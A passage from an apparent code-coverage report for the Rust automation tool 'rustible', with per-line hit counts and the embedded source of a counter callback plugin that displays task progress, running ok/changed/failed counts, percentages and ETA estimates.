assert!(output.contains(\"changed=2\"));\n        assert!(output.contains(\"failed=1\"));\n    }\n}\n","traces":[{"line":163,"address":[25825072],"length":1,"stats":{"Line":1}},{"line":169,"address":[25825085],"length":1,"stats":{"Line":1}},{"line":236,"address":[25846560],"length":1,"stats":{"Line":1}},{"line":237,"address":[25846574],"length":1,"stats":{"Line":1}},{"line":253,"address":[25833986,25832784,25833919],"length":1,"stats":{"Line":1}},{"line":254,"address":[25832806],"length":1,"stats":{"Line":1}},{"line":256,"address":[25304048,25304069],"length":1,"stats":{"Line":3}},{"line":260,"address":[25832965,25833040],"length":1,"stats":{"Line":2}},{"line":261,"address":[25833140,25833935],"length":1,"stats":{"Line":2}},{"line":266,"address":[25833263,25833216],"length":1,"stats":{"Line":2}},{"line":267,"address":[25833334,25833381],"length":1,"stats":{"Line":2}},{"line":268,"address":[25833519,25833444],"length":1,"stats":{"Line":2}},{"line":269,"address":[25833640,25833554],"length":1,"stats":{"Line":2}},{"line":270,"address":[25833675,25833761],"length":1,"stats":{"Line":2}},{"line":277,"address":[25846752],"length":1,"stats":{"Line":1}},{"line":278,"address":[25846781],"length":1,"stats":{"Line":1}},{"line":282,"address":[25846766],"length":1,"stats":{"Line":1}},{"line":288,"address":[25846896],"length":1,"stats":{"Line":1}},{"line":289,"address":[25846925],"length":1,"stats":{"Line":1}},{"line":294,"address":[25846910],"length":1,"stats":{"Line":1}},{"line":300,"address":[25846624],"length":1,"stats":{"Line":1}},{"line":301,"address":[25846653],"length":1,"stats":{"Line":1}},{"line":308,"address":[25846638],"length":1,"stats":{"Line":1}},{"line":313,"address":[25837394,25837400,25837200],"length":1,"stats":{"Line":1}},{"line":314,"address":[25837240],"length":1,"stats":{"Line":1}},{"line":315,"address":[25837246],"length":1,"stats":{"Line":1}},{"line":318,"address":[25837263],"length":1,"stats":{"Line":1}},{"line":319,"address":[25837375,25837282],"length":1,"stats":{"Line":2}},{"line":321,"address":[25304672,25304690],"length":1,"stats":{"Line":3}},{"line":325,"address":[25826768],"length":1,"stats":{"Line":1}},{"line":326,"address":[25826846],"length":1,"stats":{"Line":1}},{"line":327,"address":[25826886],"length":1,"stats":{"Line":1}},{"line":329,"address":[25826870],"length":1,"stats":{"Line":1}},{"line":334,"address":[25835658,25834016,25836048],"length":1,"stats":{"Line":1}},{"line":335,"address":[25834079],"length":1,"stats":{"Line":1}},{"line":336,"address":[25834144],"length":1,"stats":{"Line":0}},{"line":339,"address":[25834167,25834101],"length":1,"stats":{"Line":1}},{"line":340,"address":[25834177],"length":1,"stats":{"Line":1}},{"line":341,"address":[25834216],"length":1,"stats":{"Line":1}},{"line":342,"address":[25834255],"length":1,"stats":{"Line":1}},{"line":343,"address":[25834286],"length":1,"stats":{"Line":1}},{"line":344,"address":[25834298],"length":1,"stats":{"Line":1}},{"line":345,"address":[25834657],"length":1,"stats":{"Line":1}},{"line":347,"address":[25834595],"length":1,"stats":{"Line":1}},{"line":348,"address":[25834636],"length":1,"stats":{"Line":1}},{"line":351,"address":[25834440],"length":1,"stats":{"Line":1}},{"line":354,"address":[25834339],"length":1,"stats":{"Line":1}},{"line":355,"address":[25834359],"length":1,"stats":{"Line":1}},{"line":356,"address":[25834908],"length":1,"stats":{"Line":1}},{"line":357,"address":[25834882,25835088],"length":1,"stats":{"Line":1}},{"line":358,"address":[25835111],"length":1,"stats":{"Line":0}},{"line":360,"address":[25834939],"length":1,"stats":{"Line":1}},{"line":363,"address":[25304560,25304588],"length":1,"stats":{"Line":3}},{"line":365,"address":[25835324,25835066],"length":1,"stats":{"Line":2}},{"line":366,"address":[25835674,25835362],"length":1,"stats":{"Line":0}},{"line":368,"address":[25835330,25835407],"length":1,"stats":{"Line":2}},{"line":372,"address":[25834386],"length":1,"stats":{"Line":1}},{"line":373,"address":[25834406],"length":1,"stats":{"Line":1}},{"line":374,"address":[25836094],"length":1,"stats":{"Line":1}},{"line":375,"address":[25836255,25836069],"length":1,"stats":{"Line":0}},{"line":376,"address":[25836278],"length":1,"stats":{"Line":0}},{"line":381,"address":[25304532,25304147,25304096,25304538],"length":1,"stats":{"Line":0}},{"line":382,"address":[25304160],"length":1,"stats":{"Line":0}},{"line":383,"address":[25304233],"length":1,"stats":{"Line":0}},{"line":385,"address":[25304272,25304200],"length":1,"stats":{"Line":0}},{"line":387,"address":[25304302,25304383],"length":1,"stats":{"Line":0}},{"line":390,"address":[25836240,25836487],"length":1,"stats":{"Line":0}},{"line":391,"address":[25836825,25836522],"length":1,"stats":{"Line":0}},{"line":393,"address":[25836493,25836564],"length":1,"stats":{"Line":0}},{"line":401,"address":[25846546,25846320,25846540],"length":1,"stats":{"Line":0}},{"line":402,"address":[25846335],"length":1,"stats":{"Line":0}},{"line":406,"address":[25846302,25846112,25846296],"length":1,"stats":{"Line":0}},{"line":407,"address":[25846127],"length":1,"stats":{"Line":0}},{"line":411,"address":[25837654,25837424,25837648],"length":1,"stats":{"Line":0}},{"line":412,"address":[25837455],"length":1,"stats":{"Line":0}},{"line":416,"address":[25847493,25847487,25847040],"length":1,"stats":{"Line":0}},{"line":417,"address":[25847110],"length":1,"stats":{"Line":0}},{"line":418,"address":[25847142,25847207],"length":1,"stats":{"Line":0}},{"line":422,"address":[25839000,25839006,25837680],"length":1,"stats":{"Line":0}},{"line":423,"address":[25837738,25837807],"length":1,"stats":{"Line":0}},{"line":427,"address":[25837763],"length":1,"stats":{"Line":0}},{"line":429,"address":[25837788],"length":1,"stats":{"Line":0}},{"line":430,"address":[25839034,25837897],"length":1,"stats":{"Line":0}},{"line":435,"address":[25837829],"length":1,"stats":{"Line":0}},{"line":436,"address":[25304736,25304754],"length":1,"stats":{"Line":0}},{"line":438,"address":[25838250,25838036],"length":1,"stats":{"Line":0}},{"line":440,"address":[25838413,25838460,25838353],"length":1,"stats":{"Line":0}},{"line":443,"address":[25838535,25838574,25838427],"length":1,"stats":{"Line":0}},{"line":447,"address":[25838549,25838669],"length":1,"stats":{"Line":0}},{"line":450,"address":[25838684],"length":1,"stats":{"Line":0}},{"line":451,"address":[25838789,25838847,25838698],"length":1,"stats":{"Line":0}},{"line":456,"address":[25838920,25838721],"length":1,"stats":{"Line":0}},{"line":461,"address":[25828913,25827344,25832636],"length":1,"stats":{"Line":0}},{"line":462,"address":[25827383],"length":1,"stats":{"Line":0}},{"line":466,"address":[25827429,25827525],"length":1,"stats":{"Line":0}},{"line":470,"address":[25827438],"length":1,"stats":{"Line":0}},{"line":471,"address":[25827481],"length":1,"stats":{"Line":0}},{"line":473,"address":[25827506],"length":1,"stats":{"Line":0}},{"line":474,"address":[25827561,25832649],"length":1,"stats":{"Line":0}},{"line":479,"address":[25827541],"length":1,"stats":{"Line":0}},{"line":480,"address":[25827554],"length":1,"stats":{"Line":0}},{"line":481,"address":[25827684],"length":1,"stats":{"Line":0}},{"line":483,"address":[25827812,25827736],"length":1,"stats":{"Line":0}},{"line":484,"address":[25827962,25831273],"length":1,"stats":{"Line":0}},{"line":485,"address":[25831316,25831393],"length":1,"stats":{"Line":0}},{"line":486,"address":[25831436],"length":1,"stats":{"Line":0}},{"line":487,"address":[25831530],"length":1,"stats":{"Line":0}},{"line":488,"address":[25831618],"length":1,"stats":{"Line":0}},{"line":489,"address":[25831694],"length":1,"stats":{"Line":0}},{"line":490,"address":[25831738],"length":1,"stats":{"Line":0}},{"line":492,"address":[25832477,25831347,25832500],"length":1,"stats":{"Line":0}},{"line":493,"address":[25831782],"length":1,"stats":{"Line":0}},{"line":494,"address":[25831919,25831854],"length":1,"stats":{"Line":0}},{"line":495,"address":[25831956],"length":1,"stats":{"Line":0}},{"line":496,"address":[25832032],"length":1,"stats":{"Line":0}},{"line":498,"address":[25832310,25832333,25831879],"length":1,"stats":{"Line":0}},{"line":500,"address":[25832166,25832108],"length":1,"stats":{"Line":0}},{"line":505,"address":[25828004],"length":1,"stats":{"Line":0}},{"line":506,"address":[25828031,25828106],"length":1,"stats":{"Line":0}},{"line":507,"address":[25828273],"length":1,"stats":{"Line":0}},{"line":508,"address":[25828474],"length":1,"stats":{"Line":0}},{"line":509,"address":[25828756],"length":1,"stats":{"Line":0}},{"line":514,"address":[25828926,25828070,25828976],"length":1,"stats":{"Line":0}},{"line":515,"address":[25829003],"length":1,"stats":{"Line":0}},{"line":516,"address":[25829209],"length":1,"stats":{"Line":0}},{"line":517,"address":[25829410],"length":1,"stats":{"Line":0}},{"line":518,"address":[25829692],"length":1,"stats":{"Line":0}},{"line":523,"address":[25829888,25828940,25829856],"length":1,"stats":{"Line":0}},{"line":524,"address":[25829915],"length":1,"stats":{"Line":0}},{"line":525,"address":[25830121],"length":1,"stats":{"Line":0}},{"line":526,"address":[25830824,25830393],"length":1,"stats":{"Line":0}},{"line":527,"address":[25831067],"length":1,"stats":{"Line":0}},{"line":529,"address":[25830427],"length":1,"stats":{"Line":0}},{"line":530,"address":[25830499,25830566,25830654],"length":1,"stats":{"Line":0}},{"line":540,"address":[25840497,25839168,25840491],"length":1,"stats":{"Line":0}},{"line":541,"address":[25839207],"length":1,"stats":{"Line":0}},{"line":545,"address":[25839229,25839325],"length":1,"stats":{"Line":0}},{"line":549,"address":[25839238],"length":1,"stats":{"Line":0}},{"line":550,"address":[25839281],"length":1,"stats":{"Line":0}},{"line":552,"address":[25839306],"length":1,"stats":{"Line":0}},{"line":553,"address":[25843658,25839364],"length":1,"stats":{"Line":0}},{"line":557,"address":[25839341,25839439],"length":1,"stats":{"Line":0}},{"line":558,"address":[25839540],"length":1,"stats":{"Line":0}},{"line":561,"address":[25839761],"length":1,"stats":{"Line":0}},{"line":562,"address":[25839792,25839922],"length":1,"stats":{"Line":0}},{"line":563,"address":[25839938],"length":1,"stats":{"Line":0}},{"line":564,"address":[25840060],"length":1,"stats":{"Line":0}},{"line":566,"address":[25840032],"length":1,"stats":{"Line":0}},{"line":568,"address":[25840257,25840114],"length":1,"stats":{"Line":0}},{"line":570,"address":[25840510,25839966],"length":1,"stats":{"Line":0}},{"line":571,"address":[25840526],"length":1,"stats":{"Line":0}},{"line":572,"address":[25840618],"length":1,"stats":{"Line":0}},{"line":575,"address":[25840552,25840964],"length":1,"stats":{"Line":0}},{"line":576,"address":[25840980],"length":1,"stats":{"Line":0}},{"line":577,"address":[25841072],"length":1,"stats":{"Line":0}},{"line":580,"address":[25841418,25841006],"length":1,"stats":{"Line":0}},{"line":581,"address":[25841439,25841571],"length":1,"stats":{"Line":0}},{"line":583,"address":[25841857,25841505],"length":1,"stats":{"Line":0}},{"line":584,"address":[25841878,25841963],"length":1,"stats":{"Line":0}},{"line":585,"address":[25841980],"length":1,"stats":{"Line":0}},{"line":586,"address":[25841994],"length":1,"stats":{"Line":0}},{"line":587,"address":[25842034],"length":1,"stats":{"Line":0}},{"line":589,"address":[25842010],"length":1,"stats":{"Line":0}},{"line":591,"address":[25842210,25842293],"length":1,"stats":{"Line":0}},{"line":595,"address":[25842527,25841892],"length":1,"stats":{"Line":0}},{"line":596,"address":[25842602],"length":1,"stats":{"Line":0}},{"line":604,"address":[25842617],"length":1,"stats":{"Line":0}},{"line":605,"address":[25842937,25842976],"length":1,"stats":{"Line":0}},{"line":606,"address":[25843129],"length":1,"stats":{"Line":0}},{"line":617,"address":[25843082],"length":1,"stats":{"Line":0}},{"line":619,"address":[25843142],"length":1,"stats":{"Line":0}},{"line":620,"address":[25843191,25843262],"length":1,"stats":{"Line":0}},{"line":625,"address":[25843526,25839882],"length":1,"stats":{"Line":0}},{"line":631,"address":[25845376,25846081,25846087],"length":1,"stats":{"Line":1}},{"line":632,"address":[25845435,25845575],"length":1,"stats":{"Line":1}},{"line":633,"address":[25845588,25845739,25845690],"length":1,"stats":{"Line":1}},{"line":635,"address":[25845490],"length":1,"stats":{"Line":1}},{"line":636,"address":[25845632,25845556],"length":1,"stats":{"Line":2}},{"line":637,"address":[25845663],"length":1,"stats":{"Line":1}},{"line":642,"address":[25826928,25827322,25827328],"length":1,"stats":{"Line":0}},{"line":643,"address":[25826971],"length":1,"stats":{"Line":0}},{"line":647,"address":[25843792,25845347,25845353],"length":1,"stats":{"Line":1}},{"line":648,"address":[25843848],"length":1,"stats":{"Line":1}},{"line":649,"address":[25843877],"length":1,"stats":{"Line":1}},{"line":650,"address":[25843859],"length":1,"stats":{"Line":0}},{"line":651,"address":[25843945],"length":1,"stats":{"Line":0}},{"line":653,"address":[25843922],"length":1,"stats":{"Line":0}},{"line":656,"address":[25844118,25844544,25844610,25844380,25844282,25844052,25844216,25844446,25844688],"length":1,"stats":{"Line":1}},{"line":658,"address":[25843956],"length":1,"stats":{"Line":1}},{"line":660,"address":[25844169,25844033,25844101],"length":1,"stats":{"Line":3}},{"line":661,"address":[25844265,25844333,25844193],"length":1,"stats":{"Line":3}},{"line":662,"address":[25844497,25844357,25844429],"length":1,"stats":{"Line":3}},{"line":663,"address":[25844661,25844593,25844521],"length":1,"stats":{"Line":3}},{"line":669,"address":[25849440],"length":1,"stats":{"Line":0}},{"line":670,"address":[25849448],"length":1,"stats":{"Line":0}},{"line":675,"address":[25849115,25849121,25848544],"length":1,"stats":{"Line":1}},{"line":677,"address":[25848579],"length":1,"stats":{"Line":1}},{"line":678,"address":[25848589,25848652],"length":1,"stats":{"Line":2}},{"line":679,"address":[25848657,25848717],"length":1,"stats":{"Line":2}},{"line":680,"address":[25848788,25848725],"length":1,"stats":{"Line":2}},{"line":681,"address":[25848796,25848859],"length":1,"stats":{"Line":2}},{"line":682,"address":[25848867,25848930],"length":1,"stats":{"Line":2}},{"line":683,"address":[25848938],"length":1,"stats":{"Line":1}},{"line":691,"address":[25825823],"length":1,"stats":{"Line":4}},{"line":692,"address":[26131039],"length":1,"stats":{"Line":2}},{"line":693,"address":[25299508,25299598],"length":1,"stats":{"Line":2}},{"line":695,"address":[26131054],"length":1,"stats":{"Line":1}},{"line":696,"address":[25300176,25300456,25299988,25300114,25300015],"length":1,"stats":{"Line":1}},{"line":699,"address":[25300496,25300372,25299086,25300295],"length":1,"stats":{"Line":2}},{"line":700,"address":[25300776,25300711],"length":1,"stats":{"Line":2}},{"line":702,"address":[25299107,25300916,25300791],"length":1,"stats":{"Line":1}},{"line":703,"address":[25301196,25301139],"length":1,"stats":{"Line":2}},{"line":705,"address":[25301296,25301375],"length":1,"stats":{"Line":1}},{"line":713,"address":[25289994,25290066,25289903,25290037,25290649,25289872,25290208,25292377],"length":1,"stats":{"Line":0}},{"line":714,"address":[25290121,25290242,25290024,25289971],"length":1,"stats":{"Line":0}},{"line":715,"address":[26127854],"length":1,"stats":{"Line":0}},{"line":718,"address":[25290976,25290913],"length":1,"stats":{"Line":0}},{"line":719,"address":[25291049,25291003],"length":1,"stats":{"Line":0}},{"line":723,"address":[25291037,25291118],"length":1,"stats":{"Line":0}},{"line":724,"address":[25291164,25291229],"length":1,"stats":{"Line":0}},{"line":726,"address":[25291236,25291428],"length":1,"stats":{"Line":0}},{"line":727,"address":[25291496,25292416],"length":1,"stats":{"Line":0}},{"line":728,"address":[25292502],"length":1,"stats":{"Line":0}},{"line":733,"address":[25291534,25291599],"length":1,"stats":{"Line":0}},{"line":734,"address":[25291651,25291722],"length":1,"stats":{"Line":0}},{"line":735,"address":[25291737],"length":1,"stats":{"Line":0}},{"line":736,"address":[25291774,25291869],"length":1,"stats":{"Line":0}},{"line":738,"address":[25291805,25291743],"length":1,"stats":{"Line":0}},{"line":741,"address":[25291842,25291915],"length":1,"stats":{"Line":0}},{"line":751,"address":[25825359],"length":1,"stats":{"Line":4}},{"line":752,"address":[25285876,25285944],"length":1,"stats":{"Line":2}},{"line":760,"address":[25286620,25286768,25285775],"length":1,"stats":{"Line":1}},{"line":761,"address":[26124206],"length":1,"stats":{"Line":2}},{"line":763,"address":[25287339,25287418],"length":1,"stats":{"Line":2}},{"line":764,"address":[25287528,25287614],"length":1,"stats":{"Line":2}},{"line":765,"address":[25287684],"length":1,"stats":{"Line":1}},{"line":770,"address":[25825275],"length":1,"stats":{"Line":0}},{"line":775,"address":[25287873,25287776,25288060,25287910,25287801,25289828,25287930,25289194],"length":1,"stats":{"Line":0}},{"line":776,"address":[26124383],"length":1,"stats":{"Line":0}},{"line":777,"address":[25288479,25288417,25288321,25289200,25288294],"length":1,"stats":{"Line":0}},{"line":779,"address":[25288667,25288595],"length":1,"stats":{"Line":0}},{"line":780,"address":[25288828],"length":1,"stats":{"Line":0}},{"line":783,"address":[25289023],"length":1,"stats":{"Line":0}},{"line":784,"address":[25287915,25289237,25289083],"length":1,"stats":{"Line":0}},{"line":785,"address":[25289525,25289463],"length":1,"stats":{"Line":0}},{"line":786,"address":[25289643,25289610,25289670],"length":1,"stats":{"Line":0}},{"line":788,"address":[25289654],"length":1,"stats":{"Line":0}},{"line":789,"address":[25289738],"length":1,"stats":{"Line":0}},{"line":790,"address":[25289759],"length":1,"stats":{"Line":0}},{"line":791,"address":[25289784],"length":1,"stats":{"Line":0}},{"line":792,"address":[25289807],"length":1,"stats":{"Line":0}},{"line":799,"address":[25292910,25292783,25293081,25292752,25292867,25294425,25297166,25292939],"length":1,"stats":{"Line":4}},{"line":800,"address":[25292844,25292897,25292994,25293115],"length":1,"stats":{"Line":2}},{"line":801,"address":[25293404,25293333],"length":1,"stats":{"Line":2}},{"line":804,"address":[25293505],"length":1,"stats":{"Line":1}},{"line":805,"address":[25295742,25295776,25293549],"length":1,"stats":{"Line":2}},{"line":806,"address":[25295983,25295907],"length":1,"stats":{"Line":2}},{"line":812,"address":[25293526],"length":1,"stats":{"Line":1}},{"line":813,"address":[25293685,25293585,25293651],"length":1,"stats":{"Line":2}},{"line":814,"address":[25293945,25293854],"length":1,"stats":{"Line":2}},{"line":821,"address":[25293614],"length":1,"stats":{"Line":1}},{"line":822,"address":[25295133,25295167,25294467],"length":1,"stats":{"Line":2}},{"line":823,"address":[25295401,25295217,25295323],"length":1,"stats":{"Line":1}},{"line":830,"address":[25294510,25294543,25294439],"length":1,"stats":{"Line":2}},{"line":831,"address":[25294512],"length":1,"stats":{"Line":1}},{"line":840,"address":[25294370,25296352],"length":1,"stats":{"Line":1}},{"line":841,"address":[26129758],"length":1,"stats":{"Line":0}},{"line":842,"address":[25296830,25296770],"length":1,"stats":{"Line":0}},{"line":845,"address":[25297074,25296922],"length":1,"stats":{"Line":0}},{"line":846,"address":[25296934,25296961,25297031,25297106,25297195],"length":1,"stats":{"Line":0}},{"line":851,"address":[25301756,25301728,25301904,25302239,25301823,25301850],"length":1,"stats":{"Line":0}},{"line":852,"address":[25301893,25301801],"length":1,"stats":{"Line":0}},{"line":853,"address":[25301920],"length":1,"stats":{"Line":0}},{"line":858,"address":[25298697,25297232,25297260,25297513,25298665,25297380,25297335],"length":1,"stats":{"Line":4}},{"line":859,"address":[25297365,25297435,25297315,25297544],"length":1,"stats":{"Line":2}},{"line":860,"address":[25297764,25297821],"length":1,"stats":{"Line":2}},{"line":863,"address":[25297914],"length":1,"stats":{"Line":1}},{"line":864,"address":[25298766,25298102,25298703],"length":1,"stats":{"Line":1}},{"line":867,"address":[25298138],"length":1,"stats":{"Line":1}},{"line":868,"address":[25298320,25298397,25298255],"length":1,"stats":{"Line":0}},{"line":886,"address":[25847760],"length":1,"stats":{"Line":1}},{"line":887,"address":[25847768],"length":1,"stats":{"Line":1}},{"line":891,"address":[25847904],"length":1,"stats":{"Line":1}},{"line":892,"address":[25847922],"length":1,"stats":{"Line":1}},{"line":893,"address":[25847925],"length":1,"stats":{"Line":1}},{"line":897,"address":[25847568],"length":1,"stats":{"Line":1}},{"line":898,"address":[25847591],"length":1,"stats":{"Line":1}},{"line":899,"address":[25847596],"length":1,"stats":{"Line":1}},{"line":903,"address":[25847664],"length":1,"stats":{"Line":1}},{"line":904,"address":[25847687],"length":1,"stats":{"Line":1}},{"line":905,"address":[25847692],"length":1,"stats":{"Line":1}},{"line":909,"address":[25847616],"length":1,"stats":{"Line":1}},{"line":910,"address":[25847639],"length":1,"stats":{"Line":1}},{"line":911,"address":[25847644],"length":1,"stats":{"Line":1}},{"line":915,"address":[25304784,25304941],"length":1,"stats":{"Line":1}},{"line":916,"address":[],"length":0,"stats":{"Line":0}},{"line":917,"address":[],"length":0,"stats":{"Line":0}},{"line":918,"address":[25304839,25304895],"length":1,"stats":{"Line":2}},{"line":919,"address":[25304921],"length":1,"stats":{"Line":1}},{"line":923,"address":[25847856],"length":1,"stats":{"Line":1}},{"line":924,"address":[25847873],"length":1,"stats":{"Line":1}},{"line":925,"address":[25847877],"length":1,"stats":{"Line":1}},{"line":929,"address":[25847712],"length":1,"stats":{"Line":1}},{"line":930,"address":[25847729],"length":1,"stats":{"Line":1}},{"line":931,"address":[25847733],"length":1,"stats":{"Line":1}},{"line":935,"address":[25847520],"length":1,"stats":{"Line":1}},{"line":936,"address":[25847543],"length":1,"stats":{"Line":1}},{"line":937,"address":[25847548],"length":1,"stats":{"Line":1}},{"line":941,"address":[25847792],"length":1,"stats":{"Line":1}},{"line":942,"address":[25847806],"length":1,"stats":{"Line":1}}],"covered":145,"coverable":310},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","counter.rs"],"content":"//! Counter callback plugin for Rustible.\n//!\n//! This plugin provides detailed progress tracking with running counts,\n//! percentages, and ETA estimation based on timing data.\n//!\n//! # Features\n//!\n//! - Task progress: \"Task 5/20 (25%)\"\n//! - Host progress: \"Host 3/10\"\n//! - Running success/failure/changed/skipped counts\n//! - Percentage completion\n//! - ETA based on average task duration\n//!\n//! # Example Output\n//!\n//! ```text\n//! PLAY [Configure webservers] *************************************************\n//!\n//! TASK [Install nginx] (1/5) ************************************************\n//! Host 1/3 | webserver1 | ok\n//! Host 2/3 | webserver2 | changed\n//! Host 3/3 | webserver3 | ok\n//! Progress: 20% | ok: 2 | changed: 1 | failed: 0 | skipped: 0 | ETA: 00:01:24\n//!\n//! RECAP ********************************************************************\n//! webserver1 : ok=5 changed=2 failed=0 skipped=0\n//! webserver2 : ok=4 changed=3 failed=0 skipped=0\n//! webserver3 : ok=5 changed=1 failed=1 skipped=0\n//!\n//! Total: 14 ok, 6 changed, 1 failed, 0 skipped in 2m 35s\n//! ```\n\nuse std::collections::HashMap;\nuse std::time::{Duration, Instant};\n\nuse async_trait::async_trait;\nuse colored::Colorize;\nuse parking_lot::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n/// Statistics tracked per host during execution.\n#[derive(Debug, Clone, Default)]\nstruct HostStats {\n    /// Count of successful tasks (no changes)\n    ok: u32,\n    /// Count of tasks that made changes\n    changed: u32,\n    /// Count of failed tasks\n    failed: u32,\n    /// Count of skipped tasks\n    skipped: u32,\n    /// Count of unreachable attempts\n    unreachable: u32,\n}\n\nimpl HostStats {\n    /// Total number of completed tasks for this host.\n    #[allow(dead_code)]\n    fn total(\u0026self) -\u003e u32 {\n        self.ok + self.changed + self.failed + self.skipped + self.unreachable\n    }\n}\n\n/// Global execution statistics for progress tracking.\n#[derive(Debug, Clone, Default)]\n#[allow(dead_code)]\nstruct GlobalStats {\n    /// Total ok count across all hosts\n    ok: u32,\n    /// Total changed count across all hosts\n    changed: u32,\n    /// Total failed count across all hosts\n    failed: u32,\n    /// Total skipped count across all hosts\n    skipped: u32,\n    /// Total unreachable count across all hosts\n    unreachable: u32,\n}\n\nimpl GlobalStats {\n    /// Total number of completed task executions.\n    #[allow(dead_code)]\n    fn total(\u0026self) -\u003e u32 {\n        self.ok + self.changed + self.failed + self.skipped + self.unreachable\n    }\n}\n\n/// Task timing information for ETA calculation.\n#[derive(Debug, Clone)]\n#[allow(dead_code)]\nstruct TaskTiming {\n    /// When the task started\n    start_time: Instant,\n    /// Duration of completed tasks for averaging\n    completed_durations: Vec\u003cDuration\u003e,\n}\n\nimpl Default for TaskTiming {\n    fn default() -\u003e Self {\n        Self {\n            start_time: Instant::now(),\n            completed_durations: Vec::new(),\n        }\n    }\n}\n\nimpl TaskTiming {\n    /// Calculate average task duration.\n    fn average_duration(\u0026self) -\u003e Option\u003cDuration\u003e {\n        if self.completed_durations.is_empty() {\n            return None;\n        }\n        let total: Duration = self.completed_durations.iter().sum();\n        Some(total / self.completed_durations.len() as u32)\n    }\n\n    /// Record a completed task duration.\n    fn record_duration(\u0026mut self, duration: Duration) {\n        self.completed_durations.push(duration);\n    }\n}\n\n/// Progress state for tracking current execution position.\n#[derive(Debug, Clone, Default)]\n#[allow(dead_code)]\nstruct ProgressState {\n    /// Current task index (0-based)\n    current_task: usize,\n    /// Total number of tasks in current play\n    total_tasks: usize,\n    /// Current host index (0-based) for the current task\n    current_host: usize,\n    /// Total number of hosts in current play\n    total_hosts: usize,\n    /// Name of current task\n    current_task_name: String,\n    /// Name of current play\n    current_play_name: String,\n    /// Hosts completed for current task\n    hosts_completed_for_task: usize,\n}\n\nimpl ProgressState {\n    /// Calculate overall percentage completion.\n    fn percentage(\u0026self) -\u003e f64 {\n        if self.total_tasks == 0 || self.total_hosts == 0 {\n            return 0.0;\n        }\n\n        let total_executions = self.total_tasks * self.total_hosts;\n        let completed_executions =\n            (self.current_task * self.total_hosts) + self.hosts_completed_for_task;\n\n        (completed_executions as f64 / total_executions as f64) * 100.0\n    }\n\n    /// Calculate ETA based on average task duration.\n    fn eta(\u0026self, avg_duration: Option\u003cDuration\u003e) -\u003e Option\u003cDuration\u003e {\n        let avg = avg_duration?;\n\n        if self.total_tasks == 0 || self.total_hosts == 0 {\n            return None;\n        }\n\n        let total_executions = self.total_tasks * self.total_hosts;\n        let completed_executions =\n            (self.current_task * self.total_hosts) + self.hosts_completed_for_task;\n        let remaining = total_executions.saturating_sub(completed_executions);\n\n        Some(avg * remaining as u32)\n    }\n}\n\n/// Configuration for the counter callback.\n#[derive(Debug, Clone)]\npub struct CounterConfig {\n    /// Whether to show verbose per-host output\n    pub verbose: bool,\n    /// Whether to show ETA estimates\n    pub show_eta: bool,\n    /// Whether to use colored output\n    pub use_color: bool,\n    /// Known total number of tasks (for accurate progress)\n    pub total_tasks: Option\u003cusize\u003e,\n}\n\nimpl Default for CounterConfig {\n    fn default() -\u003e Self {\n        Self {\n            verbose: true,\n            show_eta: true,\n            use_color: true,\n            total_tasks: None,\n        }\n    }\n}\n\n/// Counter callback plugin that shows detailed progress tracking.\n///\n/// This callback provides real-time progress information including\n/// task counts, host progress, success/failure rates, and ETA.\n///\n/// # Design Principles\n///\n/// 1. **Progress Visibility**: Show \"Task X/Y\" and \"Host A/B\" progress\n/// 2. **Running Counts**: Display ok/changed/failed/skipped in real-time\n/// 3. **ETA Estimation**: Calculate remaining time based on task averages\n/// 4. **Percentage Tracking**: Overall completion percentage\n///\n/// # Usage\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::CounterCallback;\n///\n/// let callback = CounterCallback::new();\n/// executor.with_callback(Box::new(callback));\n/// ```\n#[derive(Debug)]\npub struct CounterCallback {\n    /// Configuration\n    config: CounterConfig,\n    /// Per-host execution statistics\n    host_stats: RwLock\u003cHashMap\u003cString, HostStats\u003e\u003e,\n    /// Global execution statistics\n    global_stats: RwLock\u003cGlobalStats\u003e,\n    /// Progress tracking state\n    progress: RwLock\u003cProgressState\u003e,\n    /// Timing information for ETA calculation\n    timing: RwLock\u003cTaskTiming\u003e,\n    /// Playbook start time for duration tracking\n    start_time: RwLock\u003cOption\u003cInstant\u003e\u003e,\n    /// Current playbook name\n    playbook_name: RwLock\u003cOption\u003cString\u003e\u003e,\n    /// Whether any failures occurred (for exit code)\n    has_failures: RwLock\u003cbool\u003e,\n    /// Task start time for individual task duration tracking\n    task_start_time: RwLock\u003cOption\u003cInstant\u003e\u003e,\n}\n\nimpl CounterCallback {\n    /// Creates a new counter callback plugin with default settings.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let callback = CounterCallback::new();\n    /// ```\n    #[must_use]\n    pub fn new() -\u003e Self {\n        Self::with_config(CounterConfig::default())\n    }\n\n    /// Creates a counter callback with custom configuration.\n    #[must_use]\n    pub fn with_config(config: CounterConfig) -\u003e Self {\n        // Respect NO_COLOR environment variable\n        let use_color = config.use_color \u0026\u0026 std::env::var(\"NO_COLOR\").is_err();\n\n        let mut actual_config = config;\n        actual_config.use_color = use_color;\n\n        Self {\n            config: actual_config,\n            host_stats: RwLock::new(HashMap::new()),\n            global_stats: RwLock::new(GlobalStats::default()),\n            progress: RwLock::new(ProgressState::default()),\n            timing: RwLock::new(TaskTiming::default()),\n            start_time: RwLock::new(None),\n            playbook_name: RwLock::new(None),\n            has_failures: RwLock::new(false),\n            task_start_time: RwLock::new(None),\n        }\n    }\n\n    /// Creates a counter callback with custom verbosity settings.\n    ///\n    /// # Arguments\n    ///\n    /// * `verbose` - Whether to show per-host results\n    /// * `show_eta` - Whether to show ETA estimates\n    #[must_use]\n    pub fn with_options(verbose: bool, show_eta: bool) -\u003e Self {\n        Self::with_config(CounterConfig {\n            verbose,\n            show_eta,\n            ..Default::default()\n        })\n    }\n\n    /// Returns whether any failures occurred during execution.\n    ///\n    /// Useful for determining exit codes in CI/CD.\n    pub fn has_failures(\u0026self) -\u003e bool {\n        *self.has_failures.read()\n    }\n\n    /// Format a duration as HH:MM:SS or MM:SS.\n    fn format_duration(duration: Duration) -\u003e String {\n        let total_secs = duration.as_secs();\n        let hours = total_secs / 3600;\n        let minutes = (total_secs % 3600) / 60;\n        let seconds = total_secs % 60;\n\n        if hours \u003e 0 {\n            format!(\"{:02}:{:02}:{:02}\", hours, minutes, seconds)\n        } else {\n            format!(\"{:02}:{:02}\", minutes, seconds)\n        }\n    }\n\n    /// Format a duration as human-readable string (e.g., \"2m 35s\").\n    fn format_duration_human(duration: Duration) -\u003e String {\n        let total_secs = duration.as_secs();\n        let hours = total_secs / 3600;\n        let minutes = 